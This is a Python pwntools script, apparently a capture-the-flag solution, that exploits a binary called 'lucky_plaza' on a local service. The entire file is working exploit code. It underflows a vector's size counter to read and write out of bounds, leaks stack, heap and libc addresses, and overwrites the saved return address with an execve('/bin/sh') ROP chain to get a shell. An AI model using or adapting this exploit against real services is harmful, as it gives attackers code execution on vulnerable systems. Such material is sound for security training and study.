from pwn import *
fn = "./lucky_plaza"
elf = ELF(fn, checksec=False)
context.binary = elf
libc = ELF("./libc.so.6")
p = remote("localhost", 5000)
sla = lambda x, y: p.sendlineafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")

def add(num: int):
    sla(b"Choice: ", b"1")
    sla(b"Add your lucky number!", num_to_bytes(num))

def view(idx: int) -> int:
    sla(b"Choice: ", b"2")
    sla(b"Which lucky number do you want to view?", num_to_bytes(idx))
    p.recvline()
    line = p.recvline()
    result = line[line.find(b":") + 2:-1]
    return int(result.decode("ascii"))

def modify(idx: int, val: int):
    sla(b"Choice: ", b"3")
    sla(b"Which lucky number do you want to modify?", num_to_bytes(idx))
    sla(b"What value do you want to set it to?", num_to_bytes(val))

def guess(guess: int) -> bool:
    sla(b"Choice: ", b"4")
    sla(b"Guess: ", num_to_bytes(guess))
    line = p.recvline()
    return b"Oops, try again!" not in line

def pop():
    while not guess(0):
        pass

def exit():
    sla(b"Choice: ", b"5")


sla(b"Your name: ", b"aaaa")  # value doesn't matter
pop()  # size decreases from 1 to 0
pop()  # size overflows to 0xff..
element_size = 8 # long
person_offset = 5
stack_leak = view(person_offset)
heap_leak = view(person_offset + 1)
saved_rip = stack_leak - 0x00007ffe5ef56540 + 0x007ffe5ef565c8
vector_data = heap_leak - 0x000055555556d708 + 0x000055555556d6d0
print("rip: " + hex(saved_rip))
print("data(): " + hex(vector_data))
saved_rip_idx = 1 + (saved_rip - vector_data) // element_size

libc.address = view(saved_rip_idx) - 0x007f6108dedd90 + 0x007f6108dc4000
rop = ROP([libc])
binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)
rop_payload = rop.chain()
for i in range(len(rop_payload) // element_size):
    modify(saved_rip_idx + i, u64(rop_payload[i*8:(i+1)*8]))

exit()  # ret2sys
p.interactive()